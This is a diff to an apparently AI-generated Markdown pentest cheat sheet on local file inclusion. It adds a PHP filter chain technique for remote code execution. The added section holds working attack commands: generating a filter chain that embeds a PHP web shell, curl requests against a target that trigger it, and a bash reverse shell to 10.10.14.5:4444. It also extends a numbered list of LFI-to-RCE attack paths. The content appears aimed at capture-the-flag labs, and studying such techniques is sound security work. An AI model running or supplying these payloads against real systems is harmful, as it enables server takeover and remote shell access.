@@ -222,6 +222,35 @@ zip shell.jpg shell.php
 ?file=zip:///var/www/html/uploads/shell.jpg%23shell.php&cmd=whoami
 ```
 
+### php://filter Chain RCE (No Write Required)
+
+Chains multiple PHP filter conversions to generate arbitrary content from the empty string — achieves RCE via LFI with **no writable file, no upload, no `allow_url_include`**. Works on PHP 7.1+.
+
+The encoding chain trick: stacking `convert.iconv.*` filters with `convert.base64-decode` causes the filter to construct arbitrary bytes, which PHP then executes when included.
+
+```bash
+# Install the generator
+git clone https://github.com/synacktiv/php_filter_chain_generator
+cd php_filter_chain_generator
+
+# Generate a chain that executes a PHP payload
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+
+# Output is a long php://filter/... URL — paste into the LFI parameter:
+curl "http://target.com/?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...[chain]...&cmd=id"
+
+# One-liner: generate and trigger immediately
+CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)
+curl -s "http://target.com/?file=${CHAIN}&cmd=id"
+
+# For a reverse shell payload (URL-encode the shell command)
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+# Then: ?file=<chain>&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
+```
+
+> [!tip]
+> This is one of the most reliable LFI → RCE paths on HTB. If you have LFI on a PHP app and can't write files or poison logs, try filter chains first — they require only `include()` with a controllable parameter.
+
 ### phar:// - PHP Archives
 
 ```bash
@@ -1050,9 +1079,10 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 2. LFI → Log Poisoning → RCE
 3. LFI + Upload → RCE
 4. LFI → /proc/self/environ → Poison → RCE
-5. LFI → SSH Keys → Lateral movement
-6. RFI → Reverse Shell → Full system
-7. LFI → SSRF → Internal services / Cloud metadata
+5. LFI → PHP Filter Chain → RCE (no write required, PHP 7.1+)
+6. LFI → SSH Keys → Lateral movement
+7. RFI → Reverse Shell → Full system
+8. LFI → SSRF → Internal services / Cloud metadata
 
 ---
 
@@ -1077,5 +1107,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
